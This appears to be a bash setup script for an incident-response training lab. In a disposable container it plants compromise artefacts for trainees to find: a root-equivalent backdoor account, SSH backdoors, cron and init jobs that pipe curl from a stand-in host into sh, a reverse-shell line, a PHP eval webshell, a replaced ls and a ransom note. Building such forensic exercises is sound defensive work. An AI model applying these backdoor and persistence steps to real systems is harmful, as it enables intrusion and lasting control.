#!/bin/bash
# 考场高频 Linux 夹具（ctfir-marker 前缀）。在 centos-ir-lab 以 root 执行。
# 不改 root 口令、不改 sshd 监听（只往 sshd_config 追加行）、不锁账户。
# ld.so.preload 用真实 .so 副本，避免缺库把动态链接程序全打挂。
set -e
# Refuse all real hosts and existing lab instances. Only run-linux.sh creates this environment.
[ -f /.dockerenv ] && [ "${CTFIR_DISPOSABLE_LAB:-}" = ctfir-exam-084 ] || { echo 'Disposable container required'; exit 97; }
MARKER=ctfir-marker
BAK=/var/tmp/ctfir-marker-bak
mkdir -p "$BAK"

# 备份会被整文件覆盖的配置
[ -f /etc/ld.so.preload ] && cp -a /etc/ld.so.preload "$BAK/ld.so.preload" || : > "$BAK/ld.so.preload.empty"
[ -f /etc/rc.local ] && cp -a /etc/rc.local "$BAK/rc.local" || : > "$BAK/rc.local.missing"
[ -f /etc/ssh/sshd_config ] && cp -a /etc/ssh/sshd_config "$BAK/sshd_config"
[ -f /var/www/html/index.php ] && cp -a /var/www/html/index.php "$BAK/index.php"
[ -x /usr/bin/ls ] && cp -a /usr/bin/ls "$BAK/ls"
SHADOW_MODE=$(stat -c %a /etc/shadow 2>/dev/null || echo 000)
echo "$SHADOW_MODE" > "$BAK/shadow.mode"
[ -f /root/.bashrc ] && cp -a /root/.bashrc "$BAK/bashrc"

# 账户 / 组 / sudo
sed -i "/${MARKER}/d;/ctfir-mark-empty/d;/ctfir-mark-sys/d" /etc/passwd 2>/dev/null || true
echo "${MARKER}:x:0:0:marker:/tmp:/bin/sh" >> /etc/passwd
echo "ctfir-mark-empty::19001:19001::/home/${MARKER}-home:/bin/sh" >> /etc/passwd
echo "ctfir-mark-sys:x:498:498::/var/empty:/bin/bash" >> /etc/passwd
sed -i "/${MARKER}-g/d" /etc/group 2>/dev/null || true
echo "${MARKER}-g:x:0:${MARKER}" >> /etc/group
mkdir -p /etc/sudoers.d /home/${MARKER}-home /var/empty
echo "${MARKER} ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/${MARKER}
chmod 440 /etc/sudoers.d/${MARKER} 2>/dev/null || true
chmod 0644 /etc/shadow 2>/dev/null || true

# SSH
mkdir -p /root/.ssh /etc/ssh
echo "command=\"/bin/sh\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKE ${MARKER}@kali" > /root/.ssh/authorized_keys2
chmod 600 /root/.ssh/authorized_keys2
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHIDDENHIDDENHIDDEN ${MARKER}-hidden" > /root/.ssh/.id_rsa.pub
printf 'Host *\n  ProxyCommand bash -c "exec /tmp/%s-proxy"\n' "$MARKER" > /root/.ssh/config
chmod 600 /root/.ssh/config
grep -q "^PermitRootLogin yes$" /etc/ssh/sshd_config 2>/dev/null || echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
grep -q "^PasswordAuthentication yes$" /etc/ssh/sshd_config 2>/dev/null || echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
grep -q "^Port 2222$" /etc/ssh/sshd_config 2>/dev/null || echo "Port 2222" >> /etc/ssh/sshd_config

# persist
mkdir -p /etc/cron.d /etc/profile.d /etc/systemd/system /etc/pam.d /etc/xinetd.d /etc/ld.so.conf.d \
         /etc/xdg/autostart /etc/udev/rules.d /var/spool/at /usr/lib64/python2.7/site-packages \
         /usr/lib/python2.7/site-packages /etc/init.d
echo "* * * * * root curl http://10.66.66.66/${MARKER}.sh | sh" > /etc/cron.d/${MARKER}
SO_SRC=""
for c in /lib64/libnss_files.so.2 /lib/libnss_files.so.2 /lib64/libnss_dns.so.2 /usr/lib64/libnss_files.so.2; do
  [ -f "$c" ] && SO_SRC=$c && break
done
if [ -n "$SO_SRC" ]; then
  cp -f "$SO_SRC" /tmp/${MARKER}-evil.so
  echo "/tmp/${MARKER}-evil.so" > /etc/ld.so.preload
else
  echo "/tmp/${MARKER}-evil.so" > /etc/ld.so.preload
fi
echo "auth required pam_exec.so /tmp/${MARKER}-pam.sh" > /etc/pam.d/${MARKER}-pam
printf 'service ctfir-marker-back\n{\n\tdisable = no\n\tsocket_type = stream\n\twait = no\n\tuser = root\n\tserver = /tmp/%s-xinetd\n}\n' "$MARKER" > /etc/xinetd.d/${MARKER}
cp -f /bin/true /tmp/${MARKER}-xinetd 2>/dev/null || true
echo 'curl http://10.66.66.66/x | sh' > /etc/rc.local && chmod +x /etc/rc.local
printf '#!/bin/sh\ncurl http://10.66.66.66/x | sh\n' > /etc/init.d/${MARKER}
chmod +x /etc/init.d/${MARKER}
echo "/tmp/${MARKER}-lib" > /etc/ld.so.conf.d/${MARKER}.conf
grep -q "${MARKER}.invalid" /etc/hosts || echo "10.66.66.66 ${MARKER}.invalid" >> /etc/hosts
echo "alias ssh='${MARKER}'" > /etc/profile.d/${MARKER}.sh
echo "alias ls='/tmp/${MARKER}'" >> /etc/profile.d/${MARKER}.sh
echo "umask 022" > /etc/profile.d/${MARKER}-umask.sh
printf '[Service]\nExecStart=/tmp/%s.sh\n' "$MARKER" > /etc/systemd/system/${MARKER}.service
printf '[Timer]\nOnCalendar=*\n' > /etc/systemd/system/${MARKER}.timer
echo "curl http://10.66.66.66/x | sh" > /var/spool/at/${MARKER}
printf '[Desktop Entry]\nType=Application\nName=%s\nExec=/tmp/%s.sh\n' "$MARKER" "$MARKER" > /etc/xdg/autostart/${MARKER}.desktop
echo 'ACTION=="add", RUN+="/tmp/ctfir-marker-udev.sh"' > /etc/udev/rules.d/99-${MARKER}.rules
echo "import os,subprocess" > /usr/lib64/python2.7/site-packages/sitecustomize.py
echo "import os,subprocess" > /usr/lib/python2.7/site-packages/sitecustomize.py
grep -q "su() {" /root/.bashrc 2>/dev/null || printf '\nsu() { echo %s; /bin/su "$@"; }\n' "$MARKER" >> /root/.bashrc
echo "bash -i >& /dev/tcp/10.66.66.66/4444 0>&1" >> /root/.bash_history

# web
mkdir -p /var/www/html /var/log/httpd /www/wwwlogs
printf '<?php eval($_POST["cmd"]); ?>\n' > /var/www/html/${MARKER}.php
printf '<?php phpinfo(); ?>\n' > /var/www/html/${MARKER}-phpinfo.php
printf '<div style="display:none"><a href="http://evil.example/bet">bet</a></div>\n' > /var/www/html/${MARKER}-blink.php
printf 'APP_KEY=%s-secret\nDB_PASSWORD=%s-pass\n' "$MARKER" "$MARKER" > /var/www/html/.env
mkdir -p /var/www/html/.git
echo "[core]" > /var/www/html/.git/config
printf '<div style="display:none"><a href="http://evil-blink.example.com/bet">bet</a></div>\n' > /var/www/html/index.php
: > /var/log/httpd/access_log
i=0; while [ $i -lt 60 ]; do
  echo '10.88.88.88 - - [13/Nov/2026:10:00:00 +0800] "POST /ctfir-marker.php HTTP/1.1" 200 -' >> /var/log/httpd/access_log
  i=$((i+1))
done
echo '10.88.88.88 - - [13/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%20SELECT%201 HTTP/1.1" 200 - "-" "sqlmap/1.7"' >> /var/log/httpd/access_log
mkdir -p /www/wwwlogs
i=0; while [ $i -lt 60 ]; do
  echo '10.88.88.88 - - [13/Nov/2026:10:00:00 +0800] "POST /ctfir-marker-bt.php HTTP/1.1" 200 -' >> /www/wwwlogs/${MARKER}.com.log
  i=$((i+1))
done
echo '10.77.77.77 - - [13/Nov/2026:10:02:00 +0800] "GET /static/../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0"' >> /www/wwwlogs/${MARKER}.com.log

# tools / sshlog / mysql / redis / suid / proc / ransom
printf 'ctfir-marker : (redacted)\n' > /tmp/.sshlog
mkdir -p /opt /var/lib/mysql /usr/bin /usr/lib64/mysql/plugin /usr/lib/mysql/plugin /etc/redis /var/log/mysql /etc/nginx
printf '[common]\nserver_addr = 10.66.66.66\nserver_port = 7000\n' > /tmp/frpc.ini
printf 'fscan' > /opt/fscan_amd64
printf 'Query\tSELECT "<?php eval(\$_POST[1]);?>" INTO OUTFILE "/var/www/html/x.php"\n' > /var/lib/mysql/${MARKER}-general.log
printf 'UDF payload' > /usr/lib64/mysql/plugin/udf.so
printf 'UDF payload' > /usr/lib/mysql/plugin/udf.so
printf '220101 10:00:00 mysqld_safe sh -c "bash -i >&/dev/tcp/10.66.66.66/3333 0>&1"\n' > /var/log/mysqld.log
printf '# Time: 2026-11-13\nSELECT "<?php eval(\$_POST[1]);?>" INTO OUTFILE "/var/www/html/%s-slow.php";\n' "$MARKER" > /var/log/mysql/mysql-slow.log
printf 'Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n' > /var/lib/mysql/mysql-bin.000001
printf 'bind 0.0.0.0\nprotected-mode no\n' > /etc/redis/redis.conf
printf 'server { root /var/www/html; }\n' > /etc/nginx/nginx.conf
printf 'YOUR FILES HAVE BEEN ENCRYPTED\nSend 0.5 BTC\n' > /root/README_DECRYPT_FILES.html
printf 'secret\n' > /root/victim.docx.locked
printf 'MZ' > /tmp/${MARKER}-invoice.pdf.exe
printf 'MZ' > /root/${MARKER}-invoice.pdf.exe
printf '#!/bin/sh\n' > /root/${MARKER}-recent.sh && chmod 755 /root/${MARKER}-recent.sh
cp /bin/true /usr/bin/${MARKER}-suid && chmod 4755 /usr/bin/${MARKER}-suid

# 命令替换（有备份）。已经是脚本就别再覆盖，避免把假 ls 当原件备份。
if [ -f "$BAK/ls" ] && ! grep -q "ctfir-marker" /usr/bin/ls 2>/dev/null; then
  printf '#!/bin/sh\necho %s\n' "$MARKER" > /usr/bin/ls && chmod 755 /usr/bin/ls
fi

# 进程：名字伪装 / 已删除 / 矿池 / 假 mysqld
cp -f /bin/sleep /tmp/${MARKER}-mismatch
bash -c "exec -a kworkerd /tmp/${MARKER}-mismatch 3600" >/dev/null 2>&1 &
cp -f /bin/sleep /tmp/${MARKER}-del
/tmp/${MARKER}-del 3600 &
sleep 0.2
rm -f /tmp/${MARKER}-del
sh -c 'sleep 3600; true' 'stratum+tcp://ctfir-marker.example:3333' &
cp -f /bin/sleep /tmp/${MARKER}-rootmw
bash -c "exec -a mysqld /tmp/${MARKER}-rootmw 3600" >/dev/null 2>&1 &

# auth 爆破日志
i=0; while [ $i -lt 22 ]; do
  echo "Nov 13 10:00:00 centos sshd[1]: Failed password for root from 10.66.66.66 port 22 ssh2" >> /var/log/secure
  i=$((i+1))
done

echo INSTALL_OK
